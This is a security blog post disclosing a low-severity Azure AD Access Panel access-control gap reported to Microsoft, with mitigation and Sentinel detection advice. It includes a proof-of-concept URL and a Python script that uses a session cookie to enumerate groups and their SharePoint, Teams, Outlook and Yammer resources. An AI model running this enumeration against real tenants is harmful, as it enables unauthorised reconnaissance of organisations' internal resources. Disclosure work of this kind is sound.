<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> CyberIntruder | Blog </title> <meta name="author" content="CyberIntruder - Molx32 "/> <meta name="description" content="A non critical lack of access control in Azure Identity API makes easier SharePoint sites enumeration."/> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"/> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="none" id="highlight_theme_light"/> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>"> <link rel="stylesheet" href="/assets/css/main.css"> <link rel="canonical" href="https://cyber-intruder.com/blog/2023/Azure-access-panel-lack-of-access-control/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"/> <script src="/assets/js/theme.js"></script> <script src="/assets/js/dark_mode.js"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="https://cyber-intruder.com/">CyberIntruder</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/projects/">projects</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/about">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/fr-fr/blog/2023/Azure-access-panel-lack-of-access-control/"> FR-FR </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">Azure security - Internal recon leveraging lack of access control</h1> <p class="post-meta">February 2, 2023</p> <p class="post-tags"> <a href="/blog/2023"> <i class="fas fa-calendar fa-sm"></i> 2023 </a>   ·   <a href="/blog/tag/pentest"> <i class="fas fa-hashtag fa-sm"></i> pentest</a>   <a href="/blog/tag/azure"> <i class="fas fa-hashtag fa-sm"></i> azure</a>   </p> </header> <article class="post-content"> <p>I recently reported to Microsoft MSRC an issue that is, from my point of view, a low-severity vulnerability that allows ‘Members’ of Azure AD tenant to enumerate group-related resources, despite hardening Azure AD settings. This could be leveraged by an attacker during internal recon phase.</p> <h3 id="context">Context</h3> <h4 id="azure-ad-setting">Azure AD setting</h4> <p>When configuring Azure AD, there are common features and settings that are usually hardened to restrict users permissions. One of these settings is <b>Restrict user ability to access groups features in the Access Panel</b>. This is used to prevent the access to the <a href="https://account.activedirectory.windowsazure.com/r#/groups" target="_blank" rel="noopener noreferrer">Access Panel groups feature</a>, and thus prevent them from enumerating groups, send request to join groups, and access groups-related information. As MSRC answered when I reported the issue : <i>The tenant wide setting, “Restrict user ability to access groups features in the Access Panel” controls users access to the My Groups UI.</i>. This is what we can leverage to improve Azure recon.</p> <h4 id="about-groups-in-azure-ad">About groups in Azure AD</h4> <p>But first of all, a small talk about groups in Azure AD. There are multiple, and here are their description (I have shamelessly copied from <a href="https://learn.microsoft.com/en-us/microsoft-365/admin/create-groups/compare-groups?view=o365-worldwide" target="_blank" rel="noopener noreferrer">MS docs</a>) :</p> <ul> <li> <b>Security groups</b> - <i>Used for granting access to resources such as SharePoint sites.</i> </li> <li> <b>M365 Groups</b> - <i>Used for collaboration between users, both inside and outside your company. They include collaboration services such as SharePoint and Planner.</i> </li> <li> <b>Mail-enabled security groups</b> - <i>Used for granting access to resources such as SharePoint, and emailing notifications to those users.</i> </li> <li> <b>Shared mailboxes</b> - <i>Used when multiple people need access to the same mailbox, such as a company information or support email address.</i> </li> <li> <b>Dynamic distribution groups</b> - <i>Created to expedite the mass sending of email messages and other information within an organization.</i> </li> <li> <b>Distribution groups</b> - <i>Used for sending email notifications to a group of people</i> Note that when a Microsoft 365 Group is created, associated resources usually come with it.</li> </ul> <p>There are multiple common methods to create a group, and depending on how you do, visibility could be set on ‘Public’ :</p> <ul> <li>Using the <a href="https://portal.azure.com" target="_blank" rel="noopener noreferrer">Azure portal</a>, you can create both security and M365 groups. Note that using this will cause M365 groups to be private, which is a good thing.</li> <li>Using the Azure CLI command <b>az group create</b> only allows you to create private security groups.</li> <li>Using the <b>New-MsolGroup</b> only allows you to create private security groups.</li> <li>Using <b>New-AzADGroup</b> command allows to create all kinds of groups with the specified visibility for M365 groups</li> </ul> <p>The last common method is using the <a href="https://admin.microsoft.com" target="_blank" rel="noopener noreferrer">M365 Admin portal</a>. As shown on the picture below, the default visibility is Public. The truth is administrator should properly configure this, but they sometimes don’t, especially when groups were created a few years ago, when security was not one of the biggest concerns for companies.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/MS_vuln_05-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/MS_vuln_05-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/MS_vuln_05-1400.webp"></source> <img src="/assets/img/MS_vuln_05.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <h3 id="why-is-it-interesting-for-an-attacker">Why is it interesting for an attacker?</h3> <p>As shown on the scheme, based on the Azure AD configuration, an attacker could enumerate interesting resources (SharePoint, Yammer, Teams, Outlook group email) and add themselves to public groups without requiring access in order to receive emails sent to the associated email address.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/MS_vuln_04-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/MS_vuln_04-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/MS_vuln_04-1400.webp"></source> <img src="/assets/img/MS_vuln_04.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <h4 id="behavior-when-configured-on-no-permissive">Behavior when configured on No (permissive)</h4> <p>When the setting is configured to be permissive, any non-privileged user can access the following data :</p> <ul> <li>List of groups</li> <li>List of resources associated to groups : Outlook, SharePoint, Yammer, Teams</li> <li>List of people member of groups</li> </ul> <p>Administrators may want to disable this feature to prevent users seing this data. <u>Note</u> : Guest users can not see this by default.</p> <div class="col-sm mt-3 mt-md-0"> <iframe width="560" height="315" src="https://www.youtube.com/embed/O8qMV-Besw8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe> </div> <h4 id="behavior-when-configured-on-yes-restrictive">Behavior when configured on Yes (restrictive)</h4> <p>When the setting is configured to be restrictive, there is an error page that prevents group and group resource enumeration. The first picture shows Azure AD with the setting set on Yes.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/MS_vuln_01-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/MS_vuln_01-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/MS_vuln_01-1400.webp"></source> <img src="/assets/img/MS_vuln_01.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <p>This second picture shows the user who can no longer access to the group feature in the Access Panel.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/MS_vuln_02-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/MS_vuln_02-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/MS_vuln_02-1400.webp"></source> <img src="/assets/img/MS_vuln_02.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> <hr> <h3 id="the-issue">The issue</h3> <h4 id="poc">POC</h4> <p>To reproduce the issue :</p> <ol> <li>As an administrator, set the <b>Restrict user ability to access groups features in the Access Panel</b> setting on <b>Yes</b> </li> <li>Authenticate as a non-privileged user</li> <li>Get a group GUID</li> <li>Access the following URL : <div class="language-plaintext highlighter-rouge"> <div class="highlight"><pre class="highlight"><code>https://account.activedirectory.windowsazure.com/r#/manageMembership?objectType=Group&amp;objectId=&lt;GUID&gt;
</code></pre></div> </div> </li> </ol> <div class="col-sm mt-3 mt-md-0"> <iframe width="560" height="315" src="https://www.youtube.com/embed/NgG_SMecn9k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe> </div> <h4 id="automation">Automation</h4> <p>Here is a probably not optimized piece of code that takes a cookie as input, and generates a CSV with all group resources URLs.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">csv</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">json</span>

<span class="c1"># Used to invoke Azure CLI commands
</span><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">completed</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">powershell</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-Command</span><span class="sh">"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">completed</span>

<span class="c1"># Used to export findings into CSV
</span><span class="k">def</span> <span class="nf">write_header</span><span class="p">():</span>
    <span class="n">s</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Id,DisplayName,JoinPolicy,SharePointUrl,TeamsUrl,OutlookUrl,YammerUrl</span><span class="se">\n</span><span class="sh">'</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">results.csv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">result_file</span><span class="p">:</span>
        <span class="n">result_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
<span class="c1"># Used to write line into CSV
</span><span class="k">def</span> <span class="nf">write_line</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">json_data</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">Id</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">DisplayName</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">JoinPolicy</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">SharePointUrl</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">TeamsUrl</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">OutlookUrl</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">json_data</span><span class="p">[</span><span class="sh">'</span><span class="s">YammerUrl</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
    
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">results.csv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">result_file</span><span class="p">:</span>
        <span class="n">result_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

<span class="c1"># Used to fecth and parse data
</span><span class="k">def</span> <span class="nf">retrieve_data</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">guid</span><span class="p">):</span>
    <span class="n">url_base</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://account.activedirectory.windowsazure.com</span><span class="sh">"</span>
    <span class="n">url_path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/group/DetailsData/</span><span class="sh">"</span>

    <span class="c1"># Final values
</span>    <span class="n">url</span> <span class="o">=</span> <span class="n">url_base</span> <span class="o">+</span> <span class="n">url_path</span> <span class="o">+</span> <span class="n">guid</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">Cache-Control</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">max-age=0</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Ch-Ua</span><span class="sh">'</span><span class="p">:</span><span class="sh">'"</span><span class="s">Opera</span><span class="sh">"</span><span class="s">;v=</span><span class="sh">"</span><span class="s">93</span><span class="sh">"</span><span class="s">, </span><span class="sh">"</span><span class="s">Not/A)Brand</span><span class="sh">"</span><span class="s">;v=</span><span class="sh">"</span><span class="s">8</span><span class="sh">"</span><span class="s">, </span><span class="sh">"</span><span class="s">Chromium</span><span class="sh">"</span><span class="s">;v=</span><span class="sh">"</span><span class="s">107</span><span class="sh">"'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Ch-Ua-Mobile</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">?0</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Ch-Ua-Platform</span><span class="sh">'</span><span class="p">:</span><span class="sh">'"</span><span class="s">Windows</span><span class="sh">"'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Fetch-Site</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">none</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Fetch-Mode</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">navigate</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Fetch-User</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">?1</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Sec-Fetch-Dest</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">document</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Accept-Encoding</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">gzip, deflate</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Accept-Language</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">en-US,en;q=0.9</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Connection</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">close</span><span class="sh">'</span>
    <span class="p">}</span>

    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">.AspNet.Cookies</span><span class="sh">'</span><span class="p">:</span> <span class="n">cookie</span><span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">splitlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">data</span>
    



<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>

    <span class="c1"># Handle cookie argument.
</span>    <span class="c1"># The '.AspNet.Cookies' must not be passed, only the hash value
</span>    <span class="n">cookie</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">cookie</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Error with provided arguments</span><span class="se">\n</span><span class="s">Example: python3 enumerate.py 1EMV2FJC_E_cwrBkZIu_ufEP[...]]7v3Lw</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


    <span class="c1"># Shoud be done with az ad group list
</span>    <span class="n">export_groups_cmd</span> <span class="o">=</span> <span class="sh">"</span><span class="s">az login; az ad group list &gt; groups.tmp</span><span class="sh">"</span>

    <span class="c1"># CONNECT MSOL
</span>    <span class="n">r</span> <span class="o">=</span> <span class="nf">run</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="n">export_groups_cmd</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">An error occured: %s</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">export_groups_cmd</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> command executed successfully!</span><span class="sh">"</span><span class="p">)</span>

    <span class="c1"># Parse JSON
</span>    <span class="c1"># Read file
</span>    <span class="n">data</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">groups.tmp</span><span class="sh">"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">utf-16</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">data_file</span><span class="p">:</span>
        <span class="nf">write_header</span><span class="p">()</span>
        <span class="n">groups</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="n">data_file</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">group</span> <span class="ow">in</span> <span class="n">groups</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="nf">retrieve_data</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">group</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">])</span>
            <span class="nf">write_line</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">*** FILE results.csv CREATED ***</span><span class="sh">"</span><span class="p">)</span></code></pre></figure> <p>See the video to look at how to use it easily.</p> <div class="col-sm mt-3 mt-md-0"> <iframe width="560" height="315" src="https://www.youtube.com/embed/vKPkMWrkkf8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe> </div> <hr> <h3 id="remediate-and-detect">Remediate and detect</h3> <h4 id="mitigation">Mitigation</h4> <p>To be clear, there’s no reliable mitigation. The only thing I identified is the configuration of the <b>UsersPermissionToReadOtherUsersEnabled</b> feature to <b>false</b>, using the command below. According to Microsoft documentation, this settings <i>“Indicates whether to allow users to view the profile info of other users in their company. This setting is applied company-wide. Set to $False to disable users’ ability to use the Azure AD module for Windows PowerShell to access user information for their organization.”</i>.</p> <figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">Set-MsolCompanySettings</span><span class="w"> </span><span class="nt">-UsersPermissionToReadOtherUsersEnabled</span><span class="w"> </span><span class="bp">$false</span></code></pre></figure> <p>Also, you may have noticed that non privileged users are allowed to use tools such as Azure CLI. This can’t be mitigated for Azure CLI, however you can disable the use of Msol module using this command.</p> <figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">Disable-AADIntTenantMsolAccess</span></code></pre></figure> <h4 id="detection">Detection</h4> <p>Altough this can’t be mitigated, you can still detect it though Azure AD non-interactive signin logs to the <b>Microsoft App Access Panel</b> application. Just send this to Microsoft Sentinel, and create a detection rule to raise an alert when multiple attempts are performed from the same user in a short timeframe.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/MS_vuln_06-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/MS_vuln_06-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/MS_vuln_06-1400.webp"></source> <img src="/assets/img/MS_vuln_06.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </article> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2025 CyberIntruder - Molx32 . </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js"></script> <script defer src="/assets/js/common.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-MFVVRMM3DK"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-MFVVRMM3DK");</script> </body> </html>